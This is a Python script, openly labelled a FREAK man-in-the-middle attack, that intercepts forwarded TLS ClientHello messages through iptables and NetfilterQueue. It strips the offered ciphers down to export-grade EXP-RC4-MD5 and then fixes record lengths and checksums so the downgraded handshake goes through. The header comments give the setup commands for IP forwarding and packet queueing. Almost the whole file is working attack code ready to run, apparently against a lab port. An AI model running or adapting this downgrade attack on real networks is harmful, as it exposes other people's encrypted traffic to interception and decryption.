#!/usr/bin/env python3
# FREAK Attack - MITM Script
# Intercepts TLS ClientHello and strips strong ciphers,
# leaving only EXP-RC4-MD5 to force a downgrade.
#
# Setup:
#   1. Enable IP forwarding:
#        echo 1 > /proc/sys/net/ipv4/ip_forward
#
#   2. Intercept forwarded packets:
#        iptables -I FORWARD -p tcp --dport 4433 -j NFQUEUE --queue-num 0
#
#   3. Run this script:
#        python3 freak_mitm.py
#
#   4. Cleanup:
#        iptables -D FORWARD -p tcp --dport 4433 -j NFQUEUE --queue-num 0
from scapy.all import *
from netfilterqueue import NetfilterQueue

def fix_lengths(payload):
    payload = bytearray(payload)

    # Fix outer TLS record version to TLS 1.2 (0x03 0x03)
    payload[1] = 0x03
    payload[2] = 0x03

    # Fix TLS record length (bytes 3-4)
    record_len = len(payload) - 5
    payload[3] = (record_len >> 8) & 0xFF
    payload[4] = record_len & 0xFF

    # Fix handshake length (bytes 6-8)
    handshake_len = len(payload) - 9
    payload[6] = (handshake_len >> 16) & 0xFF
    payload[7] = (handshake_len >> 8) & 0xFF
    payload[8] = handshake_len & 0xFF

    return bytes(payload)

def modify_ciphers(payload):
    cipher_start, cipher_end = find_cipher_suites(payload)
    
    # EXP-RC4-MD5 is 0x00 0x03
    new_ciphers = b'\x00\x03'
    new_cipher_len = len(new_ciphers).to_bytes(2, 'big')
    
    # Rebuild payload with modified cipher list
    modified = (payload[:cipher_start - 2] +   # everything before cipher length field
                new_cipher_len +                # new length field (0x00 0x02)
                new_ciphers +                   # just EXP-RC4-MD5
                payload[cipher_end:])           # rest of packet unchanged
    
    return modified

def find_cipher_suites(payload):
    # skip TLS header + handshake header
    pos = 9
    
    # skip client version
    pos += 2
    
    # skip client random
    pos += 32
    
    # read session ID length and skip it
    session_id_len = payload[pos]
    pos += 1 + session_id_len
    
    # pos now points to cipher suites length field
    cipher_suites_len = int.from_bytes(payload[pos:pos+2], 'big')
    
    # return start and end positions of cipher suites
    cipher_start = pos + 2
    cipher_end = cipher_start + cipher_suites_len
    
    return cipher_start, cipher_end

def is_client_hello(payload):
    if len(payload) < 6:        # enough bytes to read?
        return False
    if payload[0] != 0x16:      # TLS handshake content type?
        return False
    if payload[5] != 0x01:      # ClientHello handshake type?
        return False
    return True

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    
    if scapy_packet.haslayer(TCP):
        payload = bytes(scapy_packet[TCP].payload)
        
        if is_client_hello(payload):
            print("ClientHello detected! Modifying ciphers...")
            
            # modify and fix lengths
            modified = modify_ciphers(payload)
            modified = fix_lengths(modified)

            # DEBUG LINES
            print(f"Original length: {len(payload)}")
            print(f"Modified length: {len(modified)}")
            print(f"First 10 bytes: {modified[:10].hex()}")
            cipher_start, cipher_end = find_cipher_suites(payload)
            print(f"Cipher bytes in modified: {modified[cipher_start-2:cipher_end-len(payload)+len(modified)].hex()}")
            
            
            scapy_packet[TCP].payload = Raw(modified)

            # fix IP total length explicitly
            scapy_packet[IP].len = len(bytes(scapy_packet))

            # recalculate checksums
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum

            packet.set_payload(bytes(scapy_packet))
            print("Ciphers stripped! Only EXP-RC4-MD5 remains.")
    
    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

print("FREAK MITM running. Waiting for packets...")

try:
    nfqueue.run()
except KeyboardInterrupt:
    print("Stopping...")
    nfqueue.unbind()